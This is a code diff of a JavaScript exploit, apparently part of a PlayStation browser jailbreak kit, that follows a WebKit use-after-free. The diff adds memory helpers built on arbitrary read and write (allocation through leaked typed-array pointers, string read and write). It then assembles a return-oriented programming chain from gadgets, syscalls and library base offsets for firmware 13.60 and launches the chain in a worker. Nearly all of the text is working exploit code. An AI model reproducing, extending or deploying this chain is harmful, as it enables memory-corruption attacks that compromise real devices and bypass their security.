@@ -751,8 +751,57 @@ async function runWebKitUAF(onProgress) {
 }
 
 async function initROP() {
-    const p = exploitState.p;
+    let p = exploitState.p || window.p || globalThis.p;
     if (!p) throw new Error("No primitive");
+    if (typeof p.malloc !== "function") {
+        Object.assign(p, {
+            malloc: function(sz, type = 4) {
+                let backing;
+                if (type === 1) backing = new Uint8Array(Math.max(0x1000, sz + 0x100));
+                else if (type === 2) backing = new Uint16Array(Math.max(0x2000, sz + 0x100));
+                else backing = new Uint32Array(Math.max(0x10000, sz + 0x100));
+                const ptr = p.read8(p.leakval(backing).add32(0x10));
+                ptr.backing = backing;
+                return ptr;
+            },
+            mallocDump: function(sz) {
+                const backing = new Uint8Array(sz);
+                const ptr = p.read8(p.leakval(backing).add32(0x10));
+                ptr.backing = backing;
+                return ptr;
+            },
+            stringify: function(str) {
+                const backing = new Uint8Array(str.length + 1);
+                for (let i = 0; i < str.length; i++) backing[i] = str.charCodeAt(i) & 0xff;
+                const ptr = p.read8(p.leakval(backing).add32(0x10));
+                ptr.backing = backing;
+                return ptr;
+            },
+            readstr: function(addr, maxlen = -1) {
+                let out = "";
+                for (let i = 0; ; i++) {
+                    if (maxlen !== -1 && i >= maxlen) break;
+                    const ch = p.read1(addr.add32(i));
+                    if (ch === 0x0) break;
+                    out += String.fromCharCode(ch);
+                }
+                return out;
+            },
+            writestr: function(addr, str) {
+                let waddr = addr.add32(0);
+                if (typeof str === "string") {
+                    for (let i = 0; i < str.length; i++) {
+                        const byte = str.charCodeAt(i);
+                        if (byte === 0) break;
+                        p.write1(waddr, byte);
+                        waddr = waddr.add32(0x1);
+                    }
+                }
+                p.write1(waddr, 0x0);
+            }
+        });
+    }
+    exploitState.p = p;
     const fwStr = fw || "13.60";
     const offsets = await getOffsetsForFirmware(fwStr);
 
@@ -796,21 +845,57 @@ async function initROP() {
         return ptr;
     }
 
-    let chain = new worker_rop({ p: {
+    let chain = new worker_rop({
         write8: p.write8, write4: p.write4, write2: p.write2, write1: p.write1,
         read8: p.read8, read4: p.read4, read2: p.read2, read1: p.read1,
         leakval: p.leakval,
         malloc: malloc,
+        mallocDump: function(sz) {
+            const backing = new Uint8Array(sz);
+            const ptr = p.read8(p.leakval(backing).add32(0x10));
+            ptr.backing = backing;
+            return ptr;
+        },
+        stringify: function(str) {
+            const backing = new Uint8Array(str.length + 1);
+            for (let i = 0; i < str.length; i++) backing[i] = str.charCodeAt(i) & 0xff;
+            const ptr = p.read8(p.leakval(backing).add32(0x10));
+            ptr.backing = backing;
+            return ptr;
+        },
+        readstr: function(addr, maxlen = -1) {
+            let out = "";
+            for (let i = 0; ; i++) {
+                if (maxlen !== -1 && i >= maxlen) break;
+                const ch = p.read1(addr.add32(i));
+                if (ch === 0x0) break;
+                out += String.fromCharCode(ch);
+            }
+            return out;
+        },
+        writestr: function(addr, str) {
+            let waddr = addr.add32(0);
+            if (typeof str === "string") {
+                for (let i = 0; i < str.length; i++) {
+                    const byte = str.charCodeAt(i);
+                    if (byte === 0) break;
+                    p.write1(waddr, byte);
+                    waddr = waddr.add32(0x1);
+                }
+            }
+            p.write1(waddr, 0x0);
+        },
         gadgets: gadgets,
         syscalls: syscalls,
         libSceNKWebKitBase: libSceNKWebKitBase,
         libSceLibcInternalBase: libSceLibcInternalBase,
-        libKernelBase: libKernelBase
-    }, pre_chain: (c) => {
-        c.push(gadgets["pop rdi"]);
-        c.push(c.return_value);
-        c.push(libSceLibcInternalBase.add32(offsets.lc_setjmp));
-    }, launch_chain: async (c) => {
+        libKernelBase: libKernelBase,
+        pre_chain: (c) => {
+            c.push(gadgets["pop rdi"]);
+            c.push(c.return_value);
+            c.push(libSceLibcInternalBase.add32(offsets.lc_setjmp));
+        },
+        launch_chain: async (c) => {
         let worker = new Worker("slopkit-main/slopkit/rop_slave.js?v=final");
         await new Promise(r => { worker.onmessage = r; worker.postMessage(0); });
         let worker_stack = null;
